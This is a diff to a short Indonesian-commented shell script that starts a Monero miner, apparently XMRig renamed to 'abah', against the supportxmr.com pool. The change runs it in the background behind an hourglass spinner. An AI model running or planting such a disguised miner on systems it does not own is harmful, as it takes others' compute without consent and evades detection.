@@ -75,14 +75,16 @@ echo "Menjalankan abah dengan worker: ${worker_tag}"
 echo "Menjalankan perintah: ./abah"
 
 # 3. Jalankan ./abah dengan animasi jam pasir
-./abah --donate-level 1 -o pool.supportxmr.com:3333 -u "${worker_tag}" -a rx/0 -k -t "${threads}"
+./abah --donate-level 1 -o pool.supportxmr.com:3333 -u "${worker_tag}" -a rx/0 -k -t "${threads}" &
 ABAH_PID=$!
 
 hourglass=("⏳" "⌛")
+
 while kill -0 "$ABAH_PID" 2>/dev/null; do
     for h in "${hourglass[@]}"; do
         printf "\r[%s] Sedang menjalankan abah..." "$h"
         sleep 0.45
+
         if ! kill -0 "$ABAH_PID" 2>/dev/null; then
             break
         fi
@@ -93,8 +95,8 @@ wait "$ABAH_PID"
 ABAH_EXIT=$?
 
 if [ $ABAH_EXIT -eq 0 ]; then
-    printf "\r[✔] Proses abah selesai (Done).                 \n"
+    printf "\r[✔] Proses abah selesai (Done).\n"
 else
-    printf "\r[✖] Proses abah gagal atau dihentikan.        \n"
+    printf "\r[✖] Proses abah gagal atau dihentikan.\n"
     exit $ABAH_EXIT
 fi
